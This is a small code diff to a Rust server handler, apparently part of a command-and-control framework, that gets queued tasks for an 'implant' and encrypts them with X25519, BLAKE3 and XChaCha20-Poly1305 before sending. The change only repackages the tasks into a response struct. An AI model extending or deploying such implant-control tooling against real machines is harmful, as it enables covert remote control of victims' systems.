@@ -21,7 +21,14 @@ pub async fn implant_tasks(
     // Get only tasks from db that belongs to received implant id
     let (implant, tasks) = web::block(move || get_implant_tasks(db, implant_id)).await??;
 
-    // TODO: Implement XChaCha20-Poly1305 for encrypted communication
+    let mut response_tasks: Vec<task::ResponseTask> = vec![];
+
+    for task in tasks {
+        let response_task = task::ResponseTask::new(task.task_id, task.task, task.implant_id);
+        response_tasks.push(response_task);
+    }
+
+    // Implement XChaCha20-Poly1305 for encrypted communication
     // Convert base64 to [u8; 32]
     let server_private_key_base64 = implant.server_private_key;
     let implant_public_key_base64 = implant.public_key;
@@ -45,7 +52,7 @@ pub async fn implant_tasks(
     let blake3_hashed_key = network_encryption::blake3_hash_key(x25519_shared_secret.as_bytes());
 
     // Encrypt message (XChaCha20Poly1305)
-    let encoded_tasks = bincode::serialize(&tasks).expect("Vector encode error");
+    let encoded_tasks = bincode::serialize(&response_tasks).expect("Vector encode error");
     let (encrypted_message, nonce) =
         network_encryption::xchacha20poly1305_encrypt_message(blake3_hashed_key, &encoded_tasks);
 
